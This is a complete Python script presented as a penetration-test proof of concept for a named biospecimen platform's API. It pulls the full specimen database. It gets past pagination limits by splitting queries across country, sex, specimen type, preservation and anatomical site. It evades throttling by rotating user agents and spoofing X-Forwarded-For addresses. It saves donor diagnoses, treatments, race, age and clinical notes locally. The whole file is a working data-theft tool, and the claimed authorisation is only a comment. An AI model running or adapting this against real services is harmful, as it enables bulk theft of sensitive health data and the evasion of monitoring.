#!/usr/bin/env python3
"""
AminoChain Specimen Center — Full Database Exfiltration PoC
============================================================
Pentest engagement: OmicsOS, Inc. / AminoChain (signed agreement on file)

Demonstrates that the data-api.aminochain.io specimen endpoint is:
  1. Unauthenticated — no API key, no Bearer token, no session required
  2. Unlimited — no rate limiting, no IP-based throttling
  3. Fully enumerable — 100-page limit trivially bypassed via filter partitioning
  4. Header-spoofable — accepts X-Forwarded-For, masking the true client IP

Strategy: API caps pagination at page 100 (10K records). We bypass this by
partitioning the dataset using combinations of country, sex, specimen_type,
and preservation_category filters. Each partition is <=10K records (or <=20K
with asc+desc sort trick). For the two largest fixed-tissue partitions, we
add source_site as a 5th dimension. INSERT OR REPLACE handles dedup across
overlapping partitions.

Zero external dependencies — stdlib only.

Usage:
    python3 exfiltrate.py                  # full run, resume from checkpoint
    python3 exfiltrate.py --dry-run        # probe only, no download
    python3 exfiltrate.py --workers 10     # parallel workers (default: 10)
"""

import argparse
import json
import logging
import random
import signal
import sqlite3
import ssl
import sys
import time
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Lock

BASE_URL = "https://data-api.aminochain.io"
SPECIMEN_ENDPOINT = f"{BASE_URL}/specimen/get-by-filter"
COUNT_ENDPOINT = f"{BASE_URL}/specimen/count"
PAGE_SIZE = 100
MAX_PAGE = 100

DB_PATH = Path(__file__).parent / "specimens.db"
CHECKPOINT_PATH = Path(__file__).parent / "checkpoint.json"
PARTITIONS_CACHE = Path(__file__).parent / "partitions_cache.json"
LOG_PATH = Path(__file__).parent / "exfiltrate.log"

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0",
]

COUNTRIES = ["USA", "CAN", "UKR", "NLD", "FRA", "TUR", "IND", "NGA"]
SEXES = ["Female", "Male", "Unknown"]
SPECIMEN_TYPES = [
    "Tissue", "Serum", "Plasma", "Other", "Urine", "Whole blood", "DNA",
    "Buffy coat", "Peripheral blood mononuclear cells (PBMCs)", "RNA", "Saliva",
    "Cerebrospinal fluid (CSF)", "Fibroblast", "Synovial fluid",
    "Bone marrow mononuclear cells (BMMCs)", "Nasal secretions",
    "Aqueous humor", "Vitreous humor", "Whole globe",
    "Induced pluripotent stem cells (iPSCs)",
    "Red blood cell (RBC)/Buffy coat mixture",
]
PRESERVATIONS = [
    "Fixed", "Cryopreservation", "Fresh", "Frozen", "Other",
    "RNA-stabilizing Solution", "Suspended in Media", "Unknown", "Ambient",
]
SOURCE_SITES = [
    "Breast", "Colon", "Ovary", "Uterus", "Skin", "Lung", "Kidney",
    "Stomach", "Thyroid", "Pancreas", "Cervix", "Liver", "Prostate",
    "Head and neck", "Soft tissue", "Blood", "Small intestine", "Peritoneum",
    "Bone", "Adrenal gland", "Rectum", "Brain", "Lymph node", "Bladder",
    "Spleen", "Esophagus", "Tongue", "Salivary gland", "Thoracic cavity",
    "Fallopian tube", "Vulva", "Thymus gland", "Spinal cord", "Pharynx",
    "Heart", "Gallbladder", "Larynx", "Joint", "Adipose tissue", "Testis",
    "Synovial fluid", "Bone marrow", "Appendix", "Trachea", "Eye",
    "Serum", "Plasma", "Whole blood", "Urine", "Cerebrospinal fluid",
]

shutdown_requested = False
db_lock = Lock()
ssl_ctx = ssl.create_default_context()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_PATH),
        logging.StreamHandler(),
    ],
)
log = logging.getLogger("exfiltrate")


def signal_handler(sig, frame):
    global shutdown_requested
    log.warning("Shutdown requested — saving state")
    shutdown_requested = True


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def random_ip():
    while True:
        octets = [random.randint(1, 254) for _ in range(4)]
        if octets[0] in (10, 127):
            continue
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        return ".".join(str(o) for o in octets)


def post_json(url, body, timeout=60):
    data = json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, headers={
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS),
        "X-Forwarded-For": random_ip(),
        "Referer": "https://app.aminochain.io/",
        "Accept": "application/json",
    }, method="POST")
    with urllib.request.urlopen(req, timeout=timeout, context=ssl_ctx) as resp:
        return json.loads(resp.read().decode())


def api_count(filters):
    for attempt in range(5):
        try:
            return post_json(COUNT_ENDPOINT, {"filter_set": {"filters": filters}}, timeout=30)["total_count"]
        except (urllib.error.URLError, OSError, KeyError) as e:
            wait = min(2 ** attempt + random.random(), 15)
            time.sleep(wait)
    return 0


def get_total_count():
    return api_count([])


def fetch_page(filters, page_num, sort_order="asc"):
    body = {
        "filter_set": {"filters": filters},
        "page_size": PAGE_SIZE,
        "sort": {"by": "specimen_id", "order": sort_order},
        "page": page_num,
    }
    for attempt in range(5):
        if shutdown_requested:
            return []
        try:
            data = post_json(SPECIMEN_ENDPOINT, body)
            return data.get("specimens", [])
        except (urllib.error.URLError, json.JSONDecodeError, OSError) as e:
            wait = min(2 ** attempt + random.random(), 30)
            if attempt >= 2:
                log.warning("Page %d attempt %d: %s — retry in %.1fs", page_num, attempt + 1, e, wait)
            time.sleep(wait)
    return None


# ── SQLite ──────────────────────────────────────────────────────

def init_db():
    conn = sqlite3.connect(str(DB_PATH), check_same_thread=False)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("""
        CREATE TABLE IF NOT EXISTS specimens (
            document_id TEXT PRIMARY KEY,
            specimen_id TEXT NOT NULL,
            donor_id TEXT, organization_id TEXT,
            sex TEXT, age_at_collection INTEGER, country_of_origin TEXT,
            specimen_type TEXT, specimen_category TEXT, preservation_category TEXT,
            source_site TEXT, specimen_status TEXT, quantity INTEGER, donor_race TEXT,
            date_of_collection_year INTEGER, date_of_collection_month INTEGER,
            date_of_collection_day INTEGER,
            external_donor_id TEXT, external_specimen_id TEXT,
            raw_anatomy TEXT, unstructured_preservation TEXT,
            unstructured_pathology TEXT, unstructured_clinical_data TEXT,
            unstructured_treatments TEXT,
            specimen_diagnoses TEXT, donor_diagnoses TEXT,
            specimen_treatments TEXT, donor_treatments TEXT,
            raw_json TEXT NOT NULL
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS completed_partitions (
            partition_key TEXT PRIMARY KEY,
            record_count INTEGER,
            completed_at TEXT
        )
    """)
    conn.execute("CREATE INDEX IF NOT EXISTS idx_specimen_id ON specimens(specimen_id)")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_donor_id ON specimens(donor_id)")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_specimen_type ON specimens(specimen_type)")
    conn.execute("CREATE INDEX IF NOT EXISTS idx_country ON specimens(country_of_origin)")
    conn.commit()
    return conn


def _specimen_row(s):
    doc = s.get("date_of_collection") or {}
    ext = s.get("external_ids") or {}
    return (
        s.get("document_id"), s.get("specimen_id"), s.get("donor_id"),
        s.get("organization_id"), s.get("sex"), s.get("age_at_collection"),
        s.get("country_of_origin"), s.get("specimen_type"), s.get("specimen_category"),
        s.get("preservation_category"), s.get("source_site"), s.get("specimen_status"),
        s.get("quantity"), s.get("donor_race"),
        doc.get("year"), doc.get("month"), doc.get("day"),
        ext.get("donor_id"), ext.get("specimen_id"),
        s.get("raw_anatomy"), s.get("unstructured_preservation"),
        s.get("unstructured_pathology"), s.get("unstructured_clinical_data"),
        s.get("unstructured_treatments"),
        json.dumps(s.get("specimen_diagnoses")) if s.get("specimen_diagnoses") else None,
        json.dumps(s.get("donor_diagnoses")) if s.get("donor_diagnoses") else None,
        json.dumps(s.get("specimen_treatments")) if s.get("specimen_treatments") else None,
        json.dumps(s.get("donor_treatments")) if s.get("donor_treatments") else None,
        json.dumps(s),
    )


INSERT_SQL = """INSERT OR REPLACE INTO specimens (
    document_id, specimen_id, donor_id, organization_id,
    sex, age_at_collection, country_of_origin,
    specimen_type, specimen_category, preservation_category,
    source_site, specimen_status, quantity, donor_race,
    date_of_collection_year, date_of_collection_month, date_of_collection_day,
    external_donor_id, external_specimen_id,
    raw_anatomy, unstructured_preservation,
    unstructured_pathology, unstructured_clinical_data, unstructured_treatments,
    specimen_diagnoses, donor_diagnoses, specimen_treatments, donor_treatments,
    raw_json
) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"""


def flush_to_db(conn, specimens, partition_key):
    with db_lock:
        c = conn.cursor()
        c.executemany(INSERT_SQL, [_specimen_row(s) for s in specimens])
        c.execute("INSERT OR REPLACE INTO completed_partitions VALUES (?, ?, datetime('now'))",
                  (partition_key, len(specimens)))
        conn.commit()


def is_partition_done(conn, key):
    row = conn.execute("SELECT 1 FROM completed_partitions WHERE partition_key=?", (key,)).fetchone()
    return row is not None


def get_record_count(conn):
    return conn.execute("SELECT COUNT(*) FROM specimens").fetchone()[0]


def save_checkpoint(conn, total_count):
    stored = get_record_count(conn)
    CHECKPOINT_PATH.write_text(json.dumps({
        "total_count": total_count, "stored": stored,
        "pct": round(stored / total_count * 100, 1),
        "last_updated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }, indent=2))


# ── Partition generation ────────────────────────────────────────

def make_filter(key, value):
    return {"key": key, "operator": "equals", "value": [value]}


def partition_key(filters):
    return "|".join(f"{f['key']}={f['value'][0]}" for f in filters)


def generate_partitions():
    """Build partition list with adaptive depth. Cached to disk. Returns (filters, key, count)."""
    if PARTITIONS_CACHE.exists():
        data = json.loads(PARTITIONS_CACHE.read_text())
        partitions = [(p["filters"], p["key"], p["count"]) for p in data]
        log.info("Loaded %d partitions from cache", len(partitions))
        return partitions

    log.info("Building partition map...")
    partitions = []

    def add(f, c):
        partitions.append((f, partition_key(f), c))

    for country in COUNTRIES:
        f1 = [make_filter("country_of_origin", country)]
        c1 = api_count(f1)
        if c1 == 0: continue
        if c1 <= 10000: add(f1, c1); continue

        for sex in SEXES:
            f2 = f1 + [make_filter("sex", sex)]
            c2 = api_count(f2)
            if c2 == 0: continue
            if c2 <= 10000: add(f2, c2); continue

            for stype in SPECIMEN_TYPES:
                f3 = f2 + [make_filter("specimen_type", stype)]
                c3 = api_count(f3)
                if c3 == 0: continue
                if c3 <= 20000: add(f3, c3); continue

                for pres in PRESERVATIONS:
                    f4 = f3 + [make_filter("preservation_category", pres)]
                    c4 = api_count(f4)
                    if c4 == 0: continue
                    if c4 <= 20000: add(f4, c4); continue

                    for site in SOURCE_SITES:
                        f5 = f4 + [make_filter("source_site", site)]
                        c5 = api_count(f5)
                        if c5 > 0: add(f5, c5)

    log.info("Generated %d partitions — caching", len(partitions))
    cache = [{"filters": f, "key": k, "count": c} for f, k, c in partitions]
    PARTITIONS_CACHE.write_text(json.dumps(cache, indent=2))
    return partitions


# ── Fetch a partition ───────────────────────────────────────────

def fetch_partition(filters, count, workers):
    """Fetch pages for a partition based on known count. Returns list of specimens."""
    all_specimens = {}

    pages_needed = min(MAX_PAGE, (count + PAGE_SIZE - 1) // PAGE_SIZE)
    needs_desc = count > MAX_PAGE * PAGE_SIZE

    directions = ["asc", "desc"] if needs_desc else ["asc"]

    for direction in directions:
        if shutdown_requested:
            break
        with ThreadPoolExecutor(max_workers=workers) as pool:
            futures = {pool.submit(fetch_page, filters, p, direction): p
                       for p in range(1, pages_needed + 1)}
            for future in as_completed(futures):
                if shutdown_requested:
                    break
                result = future.result()
                if result:
                    for s in result:
                        all_specimens[s["document_id"]] = s

    return list(all_specimens.values())


# ── Main modes ──────────────────────────────────────────────────

def dry_run():
    log.info("=== DRY RUN ===")
    total = get_total_count()
    log.info("Total records: %s", f"{total:,}")
    log.info("Page limit: %d → max %d records per partition view", MAX_PAGE, MAX_PAGE * PAGE_SIZE)
    log.info("Bypass: filter-based partitioning (country/sex/type/preservation/site)")
    log.info("No auth. No rate limit. X-Forwarded-For accepted.")
    log.info("=== END DRY RUN ===")


def run(workers=10):
    total_count = get_total_count()
    log.info("Target: %s records | Workers: %d", f"{total_count:,}", workers)

    conn = init_db()
    stored = get_record_count(conn)
    if stored >= total_count:
        log.info("Already have %s records. Done.", f"{stored:,}")
        conn.close()
        return

    partitions = generate_partitions()
    remaining = [(f, k, c) for f, k, c in partitions if not is_partition_done(conn, k)]
    log.info("Partitions: %d total, %d remaining", len(partitions), len(remaining))

    start_time = time.time()
    for i, (filters, key, count) in enumerate(remaining):
        if shutdown_requested:
            break

        p_start = time.time()
        specimens = fetch_partition(filters, count, workers)

        if specimens:
            flush_to_db(conn, specimens, key)

        stored = get_record_count(conn)
        elapsed = time.time() - start_time
        p_elapsed = time.time() - p_start
        pct = stored / total_count * 100

        log.info("[%d/%d] %s: +%s in %.1fs | Total: %s/%s (%.1f%%) | %.0f rec/s",
                 i + 1, len(remaining), key,
                 f"{len(specimens):,}", p_elapsed,
                 f"{stored:,}", f"{total_count:,}", pct,
                 stored / elapsed if elapsed > 0 else 0)

        save_checkpoint(conn, total_count)

    elapsed = time.time() - start_time
    stored = get_record_count(conn)
    save_checkpoint(conn, total_count)
    conn.close()

    log.info("=" * 60)
    log.info("COMPLETE: %s/%s records (%.1f%%) in %.1f minutes",
             f"{stored:,}", f"{total_count:,}",
             stored / total_count * 100, elapsed / 60)
    log.info("DB: %s (%.1f MB)", DB_PATH, DB_PATH.stat().st_size / 1024 / 1024)
    log.info("=" * 60)


def main():
    parser = argparse.ArgumentParser(description="AminoChain specimen exfiltration PoC")
    parser.add_argument("--dry-run", action="store_true", help="Probe only")
    parser.add_argument("--workers", type=int, default=10, help="Parallel workers (default: 10)")
    args = parser.parse_args()

    log.info("AminoChain Specimen Exfiltration PoC")
    log.info("DB: %s", DB_PATH)

    if args.dry_run:
        dry_run()
    else:
        run(workers=args.workers)


if __name__ == "__main__":
    main()
